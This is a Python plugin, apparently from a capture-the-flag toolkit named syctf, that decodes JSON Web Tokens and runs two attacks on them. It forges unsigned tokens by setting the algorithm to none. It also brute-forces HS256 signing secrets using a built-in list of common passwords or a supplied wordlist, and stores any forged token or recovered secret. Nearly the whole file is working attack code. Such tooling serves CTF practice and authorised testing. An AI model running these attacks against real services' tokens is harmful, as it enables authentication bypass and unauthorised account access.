"""JWT inspection and attacks: decode, alg=none forge, HMAC secret crack."""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
from pathlib import Path

from rich.table import Table

from syctf.core.types import ExecutionContext

_COMMON_SECRETS = [
    "secret", "password", "123456", "changeme", "jwt", "key", "admin",
    "your-256-bit-secret", "supersecret", "s3cr3t", "test", "qwerty",
]


def _b64url_decode(part: str) -> bytes:
    pad = "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Return (header, payload, signature_b64). Raises ValueError if malformed."""

    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have 3 dot-separated parts")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_alg_none(header: dict, payload: dict) -> str:
    header = {**header, "alg": "none"}
    return _b64url_encode(json.dumps(header).encode()) + "." + _b64url_encode(json.dumps(payload).encode()) + "."


def crack_hs256(token: str, secrets) -> str | None:
    header_b64, payload_b64, sig_b64 = token.strip().split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode()
    target = _b64url_decode(sig_b64)
    for secret in secrets:
        secret = secret.strip()
        if not secret:
            continue
        mac = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(mac, target):
            return secret
    return None


class JwtToolPlugin:
    """Decode a JWT and run the common CTF attacks against it."""

    name = "jwt-tool"
    description = "JWT decode + attacks: alg=none forge and HS256 secret cracking"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--token", required=True, help="JWT string")
        parser.add_argument("--wordlist", help="Wordlist path for HS256 cracking")
        parser.add_argument("--forge-none", action="store_true", help="Emit an alg=none forged token")

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        try:
            header, payload, sig = decode_jwt(args.token)
        except (ValueError, json.JSONDecodeError, base64.binascii.Error) as exc:
            context.console.print(f"[bold red]Invalid JWT:[/bold red] {exc}")
            return 2

        table = Table(title="JWT", show_header=False)
        table.add_column("Field", style="cyan")
        table.add_column("Value", style="white")
        table.add_row("alg", str(header.get("alg")))
        table.add_row("typ", str(header.get("typ", "")))
        table.add_row("claims", json.dumps(payload)[:400])
        context.console.print(table)

        alg = str(header.get("alg", "")).lower()
        if alg in ("none", ""):
            context.console.print("[bold red]alg=none accepted by design — signature not verified![/bold red]")

        if args.forge_none or alg != "none":
            forged = forge_alg_none(header, payload)
            context.console.print("[bold]alg=none forgery:[/bold]")
            context.console.print(f"  {forged}")
            context.cache["jwt_forged_none"] = forged

        if alg.startswith("hs"):
            secrets = _COMMON_SECRETS
            if args.wordlist:
                path = Path(args.wordlist).expanduser()
                if path.is_file():
                    secrets = path.read_text(errors="ignore").splitlines()
            found = crack_hs256(args.token, secrets)
            if found:
                context.console.print(f"[bold green]HS256 secret cracked:[/bold green] {found!r}")
                context.cache["jwt_secret"] = found
            else:
                context.console.print("[yellow]HS256 secret not in wordlist.[/yellow]")
        return 0


plugin = JwtToolPlugin()
